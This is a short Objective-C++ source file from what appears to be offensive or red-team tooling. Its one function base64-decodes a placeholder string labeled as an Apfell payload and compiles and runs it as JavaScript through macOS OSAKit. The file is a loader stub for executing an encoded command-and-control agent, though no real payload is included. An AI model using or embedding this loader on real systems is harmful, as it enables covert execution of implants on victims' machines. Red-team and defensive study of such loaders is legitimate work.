//
//  JSRunner.cpp
//  jsrunner
//
//  Created by Chris Ross on 9/13/18.
//  Copyright © 2018 applejuice. All rights reserved.
//

#include <stdio.h>
#include <Foundation/Foundation.h>
#import <OSAKit/OSAKit.h>
#include <Cocoa/Cocoa.h>
#include <string.h>
#include <stdlib.h>
#include <wchar.h>
#include <assert.h>
#include <pthread.h>
#include "plugin.hpp"

void initializeJS()
{
    @autoreleasepool {
        NSString *encString = @"BASE64 ENCODED APFELL PAYLOAD HERE";
        
        NSData *decodedData = [[NSData alloc] initWithBase64EncodedString:encString options:0];
        NSString *decString = [[NSString alloc] initWithData:decodedData encoding:NSASCIIStringEncoding];
        OSALanguage *lang = [OSALanguage languageForName:@"JavaScript"];
        OSAScript *script = [[OSAScript alloc] initWithSource:decString language:lang];
        NSDictionary *__autoreleasing compileError;
        NSDictionary *__autoreleasing runError;
        [script compileAndReturnError:&compileError];
        NSAppleEventDescriptor* res = [script executeAndReturnError:&runError];
        BOOL didSucceed = (res != nil);
        
    }
}
